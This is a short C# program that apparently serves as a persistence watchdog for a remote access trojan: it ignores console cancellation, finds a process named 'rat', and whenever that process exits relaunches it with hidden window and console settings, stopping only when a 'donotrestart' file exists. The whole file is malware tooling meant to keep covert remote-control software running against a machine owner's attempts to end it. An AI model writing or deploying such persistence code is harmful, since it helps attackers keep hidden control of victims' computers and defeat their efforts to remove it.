using System.Diagnostics;

Console.CancelKeyPress += (sender, e) => {
    e.Cancel = true;
    Console.WriteLine("Resisting cancellation...");
};

Process[] processes = Process.GetProcessesByName("rat");
if (processes.Length == 0) {
    Console.WriteLine("Error: RAT process is not running");
    return 1;
}

Process rat = processes[0];
string exePath = rat.MainModule!.FileName!;
while (true) {
    rat.WaitForExit();
    if (File.Exists("donotrestart")) {
        Console.WriteLine("RAT process exited with code 69, not restarting...");
        File.Delete("donotrestart");
        break;
    }
    Console.WriteLine("RAT process has exited, restarting...");
    ProcessStartInfo start =
        new() {
            FileName = exePath,
            WindowStyle = ProcessWindowStyle.Hidden, // Hides GUI
            CreateNoWindow = true, // Hides console
            Arguments = "resist fromkeepalive"
        };
    rat = Process.Start(start);
}

return 0;